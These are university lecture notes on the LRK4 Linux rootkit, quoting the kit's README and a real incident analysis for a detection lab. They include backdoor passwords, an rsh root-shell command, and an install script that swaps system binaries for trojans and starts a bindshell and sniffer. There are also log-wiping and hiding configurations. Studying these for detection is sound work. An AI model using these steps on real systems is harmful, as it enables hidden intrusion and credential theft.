<html>

<head>
<title>An Example RootKit: LRKIV</title>
<meta name="author" content="Prabhaker Mateti">
<meta name="keywords"
content="Rootkits, Internet security, Network security, TCP/IP security">
<meta name="description"
content="This page is part of a set of lectures notes for a course
on Internet Security by Prabhaker Mateti http://www.cs.wright.edu/~pmateti/">
<meta http-equiv="Content-Style-Type" content="text/css">

<style type="text/css">
  a:hover      { color: blue; background-color: yellow; }
  a:active     { color: white; background-color: green;}
  P { text-align: justify }
  pre {border:blue 1px dotted;}
  tt {border:blue 1px dotted;}
  li { text-align: justify; }
  @page { size: 8.5in 11in }
  @media screen {BODY {white; margin: 10%} }
  body {counter-reset: chapter; counter-reset: section;}
  h2:before {content: counter(section) ". "; counter-increment: section;}
</style>
</head>

<body>

  <h1>An Example Rootkit: LRKIV</h1>
  
<h3><a target="_blank" href="http://www.cs.wright.edu/~pmateti">
Prabhaker Mateti</a></h3>

<blockquote><p>
Abstract:  Rootkits are collections of programs that attempt to
hide the activity of an attacker after root access was already
gained.  The lab experiments involve detecting rootkits on an
already rooted Linux system.</blockquote>

<h3><a name="Table of Contents">Table of Contents</a></h3>
<ol>
  <li><a
    href="#Educational Objective"> Educational Objectives</a>
  <li>LRK: Read-Me of an Example Rootkit
  <li><a href="#Analysis of N.F.O Incident">Analysis of N.F.O Incident</a>
  <li>Source Code of Rootkits
  <li><a href="#Rootkit Detection">Rootkit Detection</a></li>
  <li><a href="#Lab Experiment">Lab Experiment</a>
  <li><a href="#Acknowledgements">Acknowledgements</a>
  <li><a href="#References">References</a></li>
</ol>


<h3><a name="Educational Objective">Educational Objectives</a></h3>

<ol>
  <li>Understand the structure of rootkits.
  <li>Learn to &quot;sense&quot; the presence of rootkits.</li>
</ol>

<h2>Rootkits</h2>

<p>
Rootkits are collections of programs that an intruder would install
after having gained root access.  His overall goal is to hide his
future activity on that system.  A rootkit replaces with Trojans of
existing and well-known programs.

<ol>
  <li>A rootkit would disable auditing when a certain user is logged on.
  <li>A rootkit would allow anyone to login if a certain backdoor
    password is used.
  <li>A rootkit could patch the kernel itself, allowing anyone to run privileged
    code if they use a special filename.
</ol>

<p>Rootkits have appeared for all major OS, including Windows.
Occasionally, overzealous companies (Sony in 2005) have used rootkits
embedded in their products in an attempt to protect their intellectual
property.</p>


<h2><a name="An Example Rootkit">LRK: An Example Rootkit</a></h2>

<p>The following is an announcement of a rootkit release.  [Spelling
mistakes are not corrected.]  Several excerpts from its README are
presented below so that a typical rootkit can be "appreciated."  The
latest version of the kit apparently is LRK6, but its source code is
not readily found.  Web search for LRK4.1 or LRK5.</p>

<pre>
Lord Somer is extremely pleased to bring you..
 _     _                    ____             _   _    _ _     ___ ___      ___
| |   (_)_ __  _   ___  __ |  _ \ ___   ___ | |_| | _(_) |_  |_ _|\  \    /  /
| |   | | '_ \| | | \ \/ / | |_) / _ \ / _ \| __| |/ / | __|  | |  \  \  /  /
| |___| | | | | |_| |>  <  |  _ < (_) | (_) | |_|   <| | |_   | |   \  \/  /
|_____|_|_| |_|\__,_/_/\_\ |_| \_\___/ \___/ \__|_|\_\_|\__| |___|   \____/
Released November 26, 1998<br>
"for turkeyday this year I bring you Linux Rootkit 4"

...

This packages includes the following:

bindshell	port/shell type daemon!
chfn		Trojaned! User->r00t
chsh		Trojaned! User->r00t
crontab         Trojaned! Hidden Crontab Entries
du		Trojaned! Hide files
find		Trojaned! Hide files
fix		File fixer!
ifconfig	Trojaned! Hide sniffing
inetd		Trojaned! Remote access
killall		Trojaned! Wont kill hidden processes
linsniffer	Packet sniffer!
login		Trojaned! Remote access
ls		Trojaned! Hide files
netstat		Trojaned! Hide connections
passwd		Trojaned! User->r00t
pidof		Trojaned! Hide processes
ps		Trojaned! Hide processes
rshd		Trojaned! Remote access
sniffchk	Program to check if sniffer is up and running
syslogd		Trojaned! Hide logs
tcpd		Trojaned! Hide connections, avoid denies
top		Trojaned! Hide processes
wted		wtmp/utmp editor!
z2		Zap2 utmp/wtmp/lastlog eraser!

USAGE
OK I will go thru how to use each program one by one. NOTE when I say password
I mean the rootkit password not your users password (doh!). By default the
rootkit password is satori.

chfn -		Local user->root. Run chfn then when it asks you for a new name
		enter your password.

chsh -		Local user->root. Run chsh when it asks you for a new shell
		enter your password.

crontab -	Loads a file defined as TAB_NAME in rootkit.h, by default /dev/hda02
		This file should have the following syntax:
		username regularcrontabentry
		ie: say to run your botchk for your hidden eggdrop as user hack you'd use:
		hacker 0,10,20,30,40,50 * * * *   /home/hack/eggdrop1.1.5/botchk >/dev/null 2>&1

                NOTE: the user must already have a crontab, do crontab -lu username
                      to see if they have one

du -		See documentation for ls

find -		See documentation for ls

fix -		Replaces and fixes timestamp/checksum infomation on files.


ifconfig -	Modified to remove PROMISC flag when sniffing.

inetd -		Don't even *think* about asking ;-) It ain't that hard..

killall -	All process of type 2 and 3 in the ROOTKIT_PROCESS_FILE cant be killed using 
		killall.
		say our process file had this in it:
        	2 linsniffer
		3 hack
		if you typed killall linsniffer, it wouldn't kill any process with the fullname
		of linsniffer, but if you typed killall somehackerprogs it wouldn't kill any 
		process with hack in it.  See ps for more information as they run on the same
		list, along with the pidof trojan.

linsniffer -	A great packet sniffer, very simple to use just run: ./linsniffer > tcp.log &
		Come back in a few hours and read your logs of ftps/imaps/telnets :)
		Some other sniffers if you want more configurability are:
		Sniffit: http://reptile.rug.ac.be/~coder/sniffit/sniffit.html

login -		Allows login to any account with the rootkit password.
		If root login is refused on your terminal login as "rewt".
		Disables history logging when backdoor is used.

ls -		Trojaned to hide specified files and dirs.
		The data file is ROOTKIT_FILES_FILE, defaults to /dev/ptyr.
		All files can be listed with 'ls -/' if SHOWFLAG is enabled.
		(see rootkit.h)
		The format of /dev/ptyr is:
		ptyr
		hack.dir
		w4r3z
		ie. just the filenames. This would hide any files/dirs with the
		names ptyr, hack.dir and w4r3z.

netstat -	Modified to remove tcp/udp/sockets from or to specified
		addresses, uids and ports. The file is ROOTKIT_ADDRESS_FILE.
		default data file: /dev/ptyq
		type 0: hide uid
		type 1: hide local address
		type 2: hide remote address
		type 3: hide local port
		type 4: hide remote port
		type 5: hide UNIX socket path

		example:
		0 500           <- Hides all connections by uid 500
		1 128.31        <- Hides all local connections from 128.31.X.X
		2 128.31.39.20  <- Hides all remote connections to 128.31.39.20
		3 8000          <- Hides all local connections from port 8000
		4 6667          <- Hides all remote connections to port 6667
		5 .term/socket  <- Hides all UNIX sockets including the path 
				   .term/socket

passwd -	Local user->root. Enter your rootkit password instead of your
		old password.

pidof -		Uses ROOTKIT_PROCESS_FILE, just like ps and killall do.
		pidof (some command name) normally returns the pid or pids of that command.
		Any process of type 2 or 3 in our file will be hidden just like in ps, see ps
		documentation for more information.
		NOTE: programs that run from scripts like a bash script use the name of the
		      script to hide it not the item it runs!  IE: eggdrop config files instead
		      of eggdrop ./config.file

ps -		Modified to remove specified processes.
		The file used is ROOTKIT_PROCESS_FILE, default to /dev/ptyp.
		An example data file is as follows:

        	0 0             Strips all processes running under root
        	1 p0            Strips tty p0
        	2 sniffer       Strips all programs with the name sniffer
		3 hack		Strips all programs with 'hack' in them 
				ie. proghack1, hack.scan, snhack etc.
		Don't put in the comments, obviously. Note: if this doesn't 
		seem to work make sure there are no spaces after the names, 
		and don't use the full path name.
		NOTE: programs that run from scripts like a bash script use the name of the
		      script to hide it not the item it runs!  IE: eggdrop config files instead
		      of eggdrop ./config.file


rshd -		Execute remote commands as root. 
		Usage: rsh -l rootkitpassword host command
		ie. rsh -l satori cert.org /bin/sh -i
		    would start a root shell.

sniffchk -	simple bash scrip to check if your linsniffer is running, not really necessary
		unless you setup your system to mail you the logs and you dont want to ever log
		in manually to read them, but how long do u really wanna sniff the same servers?

sshd - 		this is cool, alphabetical order.  Ok, now just do ssh -l
		rewt <host> and it wont be logged, do ssh -l <any login> <host>
		and it will be logged.  Use the rootkit password for a
		password

syslogd -	Modified to remove specified strings from logging.
		The data file is ROOTKIT_LOG_FILE, this defaults to /dev/ptys.
		Example data file:

		evil.com
		123.100.101.202
		rshd
		This would remove all logs containing the strings evil.com,
		123.100.101.202 and rshd.

tcpd -		Modified to allow access from your host without any logging. 
		Any type 1 record in the ROOTKIT_ADDRESS_FILE is used for 
		tcpd. See netstat for more infoz on this file.
		Example data file:
		1 123.4.5.6
		would set up the tcp wrappers to allow and hide connects from 
		123.4.5.6.

top -		Identical to ps.

wted -		This does lots of stuff. U can view ALL the entries in a wtmp
		or utmp type file, erase entries by username or hostname,
		view zapped users (admins use a util similar to this to find
		erased entries), erase zapped users etc.

z2 -		Zapper2! Run this to erase the last utmp/wtmp/lastlog entries
		for a username. This can be detected since it just nulls the
		entry out.
</pre>

<h2><a name="Analysis of N.F.O Incident">Analysis of N.F.O Incident</a></h2>

<p>(The following is a slightly edited version of an article that
  analyzes a real incident.)
</p>

<p>This rootkit was found on a machine running RedHat 5.2 and was probably
rooted using a rootexploit exploiting the POP2 daemon (version 4.46).
</p>

<h3>Dir <tt>/usr/include/rpc/..&nbsp;</tt></h3>

<p>The kit was found in <tt>/usr/include/rpc/..&nbsp;</tt>
(dot-dot-space) The following are the contents of this directory.
</p>
<pre>slimsheet:~/nfo# ls -al
drwxr-xr-x 9 root root   4096 Dec 31 23:31 kit2/
-rw-r--r-- 1 root root 459397 Oct 27 14:35 kit_OUT_99.tgz
-rwxr-xr-x 1 ftp  50    13766 Nov 21 21:36 t666*
-rwxr-xr-x 1 root root 106096 Nov 20 05:26 wget*

slimsheet:~/nfo# ls -al kit2/
-rwxr-xr-x 1 root root  13762 Dec 10 20:55 admbind*
drwxr-xr-x 2 root root   4096 Sep 29 18:32 bd/
drwxr-xr-x 2 root root   4096 Jan 2  22:23 bnc/
-rwxr-xr-x 1 root root   1059 Oct 3  01:49 install*
drwxr-xr-x 2 root root   4096 Sep 29 18:32 pty/
-rw-r--r-- 1 root root      1 Dec 31 23:32 readme
drwxr-xr-x 2 root root   4096 Dec 5  21:44 resetlog/
drwxr-xr-x 2 root root   4096 Dec 31 23:30 scans/
drwxr-xr-x 2 root root   4096 Sep 29 18:32 sniff/
drwxr-xr-x 2 root root   4096 Sep 30 16:21 trojans/
</pre>

<p>
The file kit_OUT_99.tgz was the original zipped kit that put itself
into ./kit2/ when untarred.  wget is used to receive files from other
servers at Internet. t666 is a bind/named remote exploit for mostly
every OS out there -- it exploits the bind 8.2.(X) version. </p>

<h3>Dir ./kit2/</h3>


<p>
If we enter the directory kit2 we'll find: admbind is probably a
remote exploit for the bind version. The readme file is where the
sniffer
<tt>./sniff/lins</tt> will log all connections; this file was 0
kb. The install file is a shell script:</p>
<pre>#!/bin/sh
#backup
echo &quot;Instalacao do Kit NFO GROUP v1.5&quot;
if [ &quot;$1&quot; != &quot;-install&quot; ]; then
  echo &quot;Use: ./install -install&quot; ; echo &quot;&quot;
  exit
fi
echo -n &quot;[*] Iniciando Backup...&quot;
/bin/cp /bin/ls /usr/doc/.sl
/bin/cp /bin/ps /usr/doc/.sp
/bin/cp /bin/netstat /usr/doc/.statnet
/bin/cp /usr/sbin/syslogd /usr/doc/.logdsys
/bin/cp /usr/sbin/tcpd /usr/doc/.dpct
/bin/cp /sbin/ifconfig /usr/doc/.gifnocfi
/bin/cp /usr/bin/find /usr/doc/.dnif
/bin/cp /bin/login /usr/doc/.nigol
echo &quot;ok&quot;

# instalacao
echo -n &quot;[*] Iniciando instalacao...&quot;
/bin/cp -f trojans/ls.trj /bin/ls
/bin/cp -f trojans/ps.trj /bin/ps
/bin/cp -f trojans/netstat.trj /bin/netstat
/bin/cp -f trojans/syslogd.trj /usr/sbin/syslogd
/bin/cp -f trojans/tcpd.trj /usr/sbin/tcpd
/bin/cp -f trojans/ifconfig.trj /sbin/ifconfig
/bin/cp -f trojans/find.trj /usr/bin/find
/bin/cp -f trojans/login.trj /bin/login
/bin/cp -f pty/pty* /dev/
echo &quot;ok&quot;

echo -n &quot;[*] Instalando backdoor...&quot;
./bd/biba 14789632159 lal
echo &quot;ok&quot;

echo -n &quot;[*] Sniffando...&quot;
./sniff/lins
echo &quot;ok&quot;

echo &quot;Instalacao completa :-)&quot;
exit</pre>

<h3>Dir ./bd/</h3>

<p>The directory <tt>./bd/</tt> includes one file
called <tt>biba</tt>.  It's the binary from what probably is a
bindshell.c copy. When it is executed by the install file it will put
itself on port 14789632159. When you execute</p>
<pre># ./biba 31337 syslogd</pre>
<p>it will bind a rootshell to port 31337 and it will look like it's
syslogd running when root execute a <tt>ps aux</tt>.  When you connect
to it using telnet, you'll not be given any prompt or anything like
that.  It will only wait for a password, and if you enter the correct
password, you'll receive a /bin/bash prompt with uid=0 (root).  The
password for this binary was discovered using a simple
<tt>strings biba</tt> as
<tt>#N#F#O#G</tt></p>

<h3>Dir ./bnc/</h3>

<p>If we change directory to <tt>./bnc/</tt> we'll find a normal
precompiled bouncer for IRC use and a file called bnc.conf which is
the config file used by the binary <tt>bnc</tt>.  The file bnc.cnf
had the following.</p>
<p>pt:54123 # port the bouncer will listen for connections<br>
ps:ziggylinda  # password you need to enter to use the bouncer.<br>
mu:3 # Max Users connections at any time.<br>
dp:6667 # Default IRC port to connect to.</p>

<h3>Dir ./pty/</h3>

<p>The directory /pty has four files: <tt>ptyp</tt>, <tt>ptyq, ptyr,
ptys</tt>. All these belong to the rootkit and various Trojans, which
are later moved to /dev. </p>

<p>The file <tt>ptyp</tt> had the following:
<tt>
2 lins, 
3 biba, 
3 sadan, 
3 lal, 
3 cleans, 
3 z2, 
3 readme, 
3 in.telnetd, 
3 promisc, 
3 cat, 
3 grep, 
3 bash, 
3 sh, 
3 bnc, 
3 rpcscan, 
3 z0ne
</tt>

This is the <i>process hiding</i> file and everything that has a 3 in front
of them will hide everything containing that string in a /bin/ps section. For
example, when it says <tt>3 biba</tt> in the file every line of output
of ps containing <tt>biba</tt> will be hidden. When it says, for
example, <tt>2 lins</tt> it will hide all applications matching the
string lins.</p>


<p>The file <tt>ptyq</tt> is the hiding file for <tt>netstat</tt>. It
will remove tcp/udp/sockets from or to specified addresses, uids and
ports. Its contents were:
<tt>0 0;
1 200.241;
1 200.244;
1 200.243;
1 200.242;
1 expert.com.br;
1 interconect.com.br;
1 amazonline.com.br;
1 libnet.com.br;
2 200.241;
2 200.242;
2 200.240;
2 200.243;
2 200.242;
2 libnet.com.br;
2 amazonline.com.br;
2 interconect.com.br;
2 amazonline.com.br;
2 14789632159;
2 988889;
3 14789632159;
3 988889;
5 /usr/include/rpc/&quot;.. &quot;/kit/;
</tt>

In the last line above, the fourth path name component is a
dot-dot-space.  From the LRK Readme, we learn the meanings of the
digits at the beginning of these lines:</p>
<blockquote>
  <p>type 0: hide uid<br>
  type 1: hide local address.<br>
  type 2: hide remote address<br>
  type 3: hide local port<br>
  type 4: hide remote port<br>
  type 5: hide UNIX socket path</p>
</blockquote>

<p>We see that the attackers want to hide all connections from 200.241-244 and
the domains libnet.com.br, expert.com.br, amazonline.com.br, 
interconect.com.br. Probably these are ISPs and it will be much easier to look
for suspicious connections when we know from what domains they may come.</p>

<p>The file <tt>ptyr</tt> has names 
<tt>ptyp ptyq ptyr ptys ..</tt>  that will be hidden from ls and du.
As you may notice thoose pty* files are hidden and also the directory
where the attacker(s) stored all the files.</p>

<p>The last file <tt>ptys</tt> has addresses <tt>200.244 200.245
200.241 200.242 expert.com.br interconect.com.br amazonline.com.br
libnet.com.br</tt> that will be hidden from syslogd.
</p>

<h3>Dir resetlog/</h3>


<p>The directory <tt>resetlog</tt> had six large file made to clean
logs; <tt>head -n 5 sadan</tt> revealed the following:</p>
<pre>
#!/bin/bash
# [-] Sadan del log v 5.0 - BETA
# [-] written by the_sphinx to NFO group '99
# [-] ninefortyone@hotmail.com
#
</pre>
<p>It seems that we can reach
at <a href="mailto:ninefortyone@hotmail.com">ninefortyone@hotmail.com</a>
concerning his &quot;cleaning-logs-skills&quot;.  

<p>
There's another file <tt>sadan-4_0-pt.sh</tt> in the same directory and we found this in
the file:
<pre>echo; echo ; echo &quot;[S] SADAN del log 4.0 - PORTUGUES&quot;
echo &quot;[S] sysdenial - tdoors@mailbr.com.br&quot;
echo &quot;[S] NFO Group OwnZ - Brazil - Out/99&quot;</pre>
<p>Yet another guy making scripts for log cleaning.</p>

<h3>Dir scans/</h3>


<p>The next directory we enter is a directory called <tt>scans</tt> and
it's from this dir all the network scans have been made. When we found this kit
there were only two files in this directory, <tt>rpcscan</tt> and <tt>z0ne</tt>
(a tool to gather IPs from a top domain, e.g., to gather all IP addresses
of *.edu). 

<h3>Dir resetlog/</h3>

<p>
In the directory <tt>resetlog</tt> we found a file named
<tt>.logs</tt> which was a simple <tt>find / -name *log* &gt;
.logs</tt> and in this file we found the following entries:
<pre>/usr/include/rpc/.. /kit2/scans/mc.log.qpop
/usr/include/rpc/.. /kit2/scans/no.log.qpop
/usr/include/rpc/.. /kit2/scans/no.log
/usr/include/rpc/.. /kit2/scans/200.log</pre>

<p>Here we see that the intruder has been scanning *.no and the class A network
200.x.x.x for vulnerabilities. We also notice that someone scanned *.no and
(maybe) *.mc for vulnerable versions of QPOP.</p>

<h3>Dir sniff/</h3>


<p>The <tt>sniff/</tt> had two files: (i) <tt>lins</tt> which was an
Ethernet packet sniffer whose default logging file
was <tt>./readme</tt>.  (ii) <tt>promisc</tt> which is a well-known
software tool to detect sniffers at all Network interfaces, eth0,
eth1, etc.</p>

<h3>Concluding Remarks</h3>

<p>The detection of this intrusion was fairly easy. We found an
application named <tt>bnc</tt> running as uid=0 (root) and simply
did <tt>find / -name '*bnc*'</tt> and found the secret directory
mentioned above.  A compromise like this would be detected on a host
running file-scanning software such as 
<a href="http://www.tripwire.org/"> http://www.tripwire.org/</a>.  </p>

<h3><a name="Lab Experiment">Lab Experiment</a></h3>

<p>Parent article: <a href="../RootKits/">
    ../KernelExploits/RootKits/</a> &bull;
  <a href="rootKitLabGS.html">Rootkit Lab Grading Sheet</a>

<h2><a name="Acknowledgements">Acknowledgements</a></h2>

<p>Section 1 is extracted from LRK release.  Section 2 is a slightly
edited version of an article that analyzes a real incident [March 8,
2000 <a href="http://www.sans.org/security-resources/idfaq/nfo.php">
http://www.sans.org/security-resources/idfaq/nfo.php</a> by Fredrik
Ostergren]. </p>

<h2><a name="References">References</a></h2>

<ol>
  <li> John
    G. Levine, <a href="http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.488.6143&rep=rep1&type=pdf">
    A Methodology for Detecting and Classifying Rootkit Exploits</a>.
    PhD Thesis, 176pp, Georgia Institute of Technology, February
    2004.  Reference.
    <li>Google Patent,
      <a href="https://patents.google.com/patent/US8056134">
      https://patents.google.com/patent/US8056134</a> Malware
      detection and identification via malware spoofing, Priority date
      2006-09-10.
    <li>
      <a href="https://packetstormsecurity.com/files/22600/lrk-4.1.tar.gz.html">
      https://packetstormsecurity.com/files/22600/lrk-4.1.tar.gz.html</a>
      C source code download.
      "Linux Rootkit v4.1 is based on Lord Somers LRK4 but several
      things are fixed. Includes a better find patch, fixed install of
      pidof / killall, fixed rshd patch, compilation fixes, and
      more. Released 11-may-2000, tested on Linux kernel 2.2.6,
      Slackware 4.0."  A worthy project: Update so it works in 2018!
</ol>

<hr size="1">

<a href="../../../copyright.html">Copyright ©</a> 2018 &bull;
<a href="mailto:pmateti@wright.edu?subject=CEG4420/Security">
  pmateti@wright.edu</a>

</body>
</html>

